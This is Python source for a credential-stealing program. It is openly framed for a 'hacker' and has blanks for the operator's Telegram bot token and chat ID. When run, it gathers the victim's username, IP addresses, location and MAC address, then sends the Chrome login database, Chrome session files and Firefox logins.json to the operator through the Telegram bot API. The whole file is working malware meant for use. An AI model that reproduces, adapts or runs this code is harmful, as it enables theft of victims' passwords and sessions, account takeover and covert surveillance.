import os,sqlite3,telebot,uuid,socket,geocoder,re,psutil,datetime,threading
from requests import post,get
new = datetime.datetime.now()

Your_TOKEN_Bot = "Enter Your Token bot (telegram)" 
Your_id = "Enter Your ID (telegram)"

bot = telebot.TeleBot(Your_TOKEN_Bot)


class Browser:
    def __init__(self):
        self.LOCLsn = sqlite3.connect(os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\Default\\Login Data")
        self.infoS = self.LOCLsn.cursor()
        self.infoS.execute('SELECT action_url, username_value, password_value FROM logins')
        self.GetData_Firefox()
    def GetSessions_google(self):
        try:
            lst = os.listdir(os.chdir(os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions'))
            for list in lst:
                try:
                    file = open(list, 'rb')
                    bot.send_document(Your_id, file, '', 'Google Sessions')
                except KeyboardInterrupt:
                    pass
        except FileNotFoundError:pass
    def GetData_google(self):
        try:
            os.chdir(os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
            try:
                file = open('Login Data', 'rb')
                bot.send_document(Your_id, file, '', 'Google Data')
                self.GetSessions_google()
            except KeyboardInterrupt:
                pass
        except FileNotFoundError:
            pass
        """ The process below arranges the data to make it easier for the hacker to read it """
        #final_data = self.infoS.fetchall()
        #for AllData in final_data:
            #url="Website  : "+str(AllData[0])
            #use="Username : "+str(AllData[1])
            #pes="Password : "+str(AllData[2])
            #with open("Hacked-chrome.txt",'a') as J : J.write('========='+url+'\n'+use+'\n'+pes+'\n')
            #post('https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}\n{}\n{}\nBy Joker @JJNN1'.format(Your_TOKEN_Bot,Your_id,url,use,pes))

    def GetData_Firefox(self):
        try:
            os.chdir(os.path.expanduser('~') + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\erbnp64y.default-release")
            try:
                file = open('logins.json', 'rb')
                bot.send_document(Your_id, file, '', 'Firefox Data')
                self.GetData_google()
            except KeyboardInterrupt:
                pass
        except FileNotFoundError:self.GetData_google()

def get_size(bytes, suffix="8"):
    JQ = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < 1024:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= JQ
def INFO_PC():
    IP0 = get("https://get.geojs.io/v1/ip.json")
    MAC = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    memory1 = psutil.virtual_memory();
    memory2 = psutil.swap_memory()
    MOMR = f"""
    [*] data TIME : {new.strftime('%I:%M %p  [%x]')}

    [✓] username : {os.getlogin()}
    [✓] location : {str(geocoder.ip('me'))}
    [✓] IP address1 : {socket.gethostbyname(socket.gethostname())}
    [✓] IP address2 : {IP0.json()["ip"]}
    [✓] mac address : {MAC}
    ━━━━━━━━━━━━━━
    virtual memory :
    Total > {get_size(memory1.total)}
    available > {get_size(memory1.available)}
    used > {get_size(memory1.used)}
    percent > {get_size(memory1.percent)}
    ━━━━━━━━━━━━━━
    swap memory :
    Total > {get_size(memory2.total)}
    free > {get_size(memory2.free)}
    used > {get_size(memory2.used)}
    percent > {get_size(memory2.percent)}
    ━━━━━━━━━━━━━━"""
    post('https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}\nBy Joker @JJNN1'.format(Your_TOKEN_Bot, Your_id,MOMR))
    Browser()

if __name__ == '__main__':
    theards = []
    for i in range(1):
        trts = threading.Thread(target=INFO_PC())
        trts.start()
        theards.append(trts)
    for trts2 in theards:
        trts2.join()
